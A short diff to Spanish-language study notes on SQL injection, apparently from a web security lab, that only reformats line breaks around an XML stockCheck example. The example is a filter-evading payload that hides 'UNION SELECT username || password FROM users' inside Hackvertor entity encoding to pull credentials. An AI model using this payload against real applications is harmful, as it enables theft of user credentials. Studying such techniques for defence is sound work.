@@ -293,15 +293,15 @@ Las implementaciones debiles usualmente buscan palabras comunes en inyecciones S
 Esto sera decodificado en el servidor antes de pasar al interprete SQL.
 Extension hackvertor usada para encodear. Selecciono lo que quiero encodear  y le doy click a la forma en que quiero encodearlo, por ejemplo hex_entities... nose.  
 Ejemplo:  
-`<?xml version="1.0" encoding="UTF-8"?>
-  <stockCheck>
-    <productId>
-      2
-    </productId>
-    <storeId>
-      <@dec_entities>1  UNION SELECT username || '~' || password FROM users<@/dec_entities>
-    </storeId>
-  </stockCheck>`
+`<?xml version="1.0" encoding="UTF-8"?>  
+  <stockCheck>  
+    <productId>  
+      2  
+    </productId>  
+    <storeId>  
+      <@dec_entities>1  UNION SELECT username || '~' || password FROM users<@/dec_entities>  
+    </storeId>  
+  </stockCheck>`  
 
 
 ## John the Ripper
